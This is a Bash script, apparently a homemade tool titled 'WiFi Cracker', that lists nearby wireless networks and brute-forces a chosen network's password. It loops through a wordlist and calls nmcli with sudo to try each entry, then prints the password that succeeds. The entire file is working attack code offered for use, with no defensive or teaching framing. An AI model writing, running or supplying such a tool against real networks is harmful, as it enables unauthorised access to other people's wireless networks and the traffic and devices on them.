#!/bin/bash

# banner

echo -e "\e[31m__        ___ _____ _    ____                _             \e[0m"
echo -e "\e[31m\ \      / (_)  ___(_)  / ___|_ __ __ _  ___| | _____ _ __ \e[0m"
echo -e "\e[31m \ \ /\ / /| | |_  | | | |   | '__/ _\` |/ __| |/ / _ \\ '__|\e[0m"
echo -e "\e[31m  \ V  V / | |  _| | | | |___| | | (_| | (__|   <  __/ |   \e[0m"
echo -e "\e[31m   \_/\_/  |_|_|   |_|  \____|_|  \__,_|\___|_|\_\___|_|   \e[0m"
echo -e "\e[31m                                                           \e[0m"
echo -e "\e[33m                                   - Developed By nillbot \e[0m"

# Check if the script is run as root
if [ "$(id -u)" == "0" ]; then
    echo "This script can't be run as root. Please do ./$0" 1>&2
    exit 1
fi

# Check if NetworkManager (nmcli) is installed
if ! command -v nmcli &> /dev/null; then
    echo "Error: NetworkManager (nmcli) is not installed." >&2
    exit 1
fi

# connect to WiFi
connect_to_wifi() {
    local ssid="$1"
    local password="$2"
    
    echo -e "\e[92mTrying Password: $password\e[0m"
    # Connect to WiFi network using nmcli
    sudo nmcli device wifi connect "$ssid" password "$password" > /dev/null 2>&1

    # Check connection status
    if [ $? -eq 0 ]; then
        echo ""
        echo -e "\e[33mSuccessfully connected to $ssid with password $password\e[0m"
        exit 0
    else
        return 1
    fi
}

# list available WiFi networks
list_wifi_networks() {
    nmcli device wifi list
}

# perform brute force
bruteforce_wifi() {
    local ssid="$1"
    local password_file="$2"

    # Check if SSID is provided
    if [ -z "$ssid" ]; then
        echo "Error: SSID is empty."
        exit 1
    fi
    
    # Use default password file if not provided
    password_file="${password_file:-pass.txt}"

    # Check if file exists
    if [ ! -f "$password_file" ]; then
        echo "Error: File $password_file not found."
        exit 1
    fi
        
    # Read passwords from file and connect to WiFi
    while IFS= read -r password; do
        connect_to_wifi "$ssid" "$password"
    done < "$password_file"
}

# Display menu
echo ""
echo "Select an option:"
echo "1. List available networks"
echo "2. Brute force a network"
echo ""

read -p "Enter your choice (1 or 2): " choice

case $choice in
    1)
        # List available WiFi connections
        echo ""
        list_wifi_networks
        ;;
    2)
        echo ""
        read -p "Enter Target WiFi SSID: " ssid
        read -p "Enter password file (default: pass.txt): " password_file
        echo ""

        # bruteforce attack the provided ssid
        bruteforce_wifi "$ssid" "$password_file"
        ;;
    *)
        echo "Invalid option. Please choose 1 or 2."
        ;;
esac
